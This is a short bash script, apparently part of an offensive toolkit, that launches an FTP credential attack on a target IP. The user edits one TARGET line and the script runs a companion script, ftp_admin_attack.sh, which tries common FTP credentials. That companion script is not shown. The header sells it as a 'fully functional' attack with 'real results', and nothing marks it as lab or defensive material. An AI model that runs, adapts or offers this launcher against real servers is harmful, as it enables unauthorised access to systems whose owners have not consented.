#!/bin/bash
# FTP Quick Attack - Just replace TARGET and run!
# One-line change, fully functional, real results

# ====== CHANGE THIS LINE ======
TARGET="192.168.1.100"
# ==============================

# Don't change anything below this line
cd "$(dirname "$0")/.."
echo "🎯 Starting FTP Attack on $TARGET..."
echo "📝 Using common FTP credentials"
echo ""
bash scripts/ftp_admin_attack.sh -t "$TARGET" -v
